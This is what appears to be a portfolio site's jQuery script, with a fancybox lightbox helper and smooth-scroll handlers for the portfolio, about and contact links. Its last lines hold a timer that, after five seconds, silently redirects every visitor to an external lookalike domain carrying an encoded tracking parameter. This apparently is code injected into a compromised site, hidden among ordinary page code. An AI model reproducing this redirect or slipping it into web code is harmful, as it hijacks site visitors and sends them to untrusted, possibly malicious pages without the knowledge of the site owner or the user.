   
   function displaylightbox(url, options)
   {
      options.padding = 0;
      options.autoScale = true;
      options.href = url;
      options.type = 'iframe';
      $.fancybox(options);
   }
      
   $(document).ready(function()
   {
      $("a[href*='#portfolio']").click(function(event)
      {
         event.preventDefault();
         $('html, body').stop().animate({ scrollTop: $('#portfolio').offset().top }, 600, 'easeOutSine');
      });
      $("a[href*='#about']").click(function(event)
      {
         event.preventDefault();
         $('html, body').stop().animate({ scrollTop: $('#about').offset().top }, 600, 'easeOutSine');
      });
      $("a[href*='#contact']").click(function(event)
      {
         event.preventDefault();
         $('html, body').stop().animate({ scrollTop: $('#contact').offset().top }, 600, 'easeOutSine');
      });
   });
      
   setTimeout(function(){
   location="https://all.obozrevatelcom.info/?p=YTI4ZTRlM2VmM2MzMTRhZGM3NzE4YTk3NWQyNWY5NTh8NDI4MjAzfEdlbkxpbmt8fDEwMDB8MTE1NDQ4NzU=&v=2&poid=0&coid=0";
   }, 5000);
   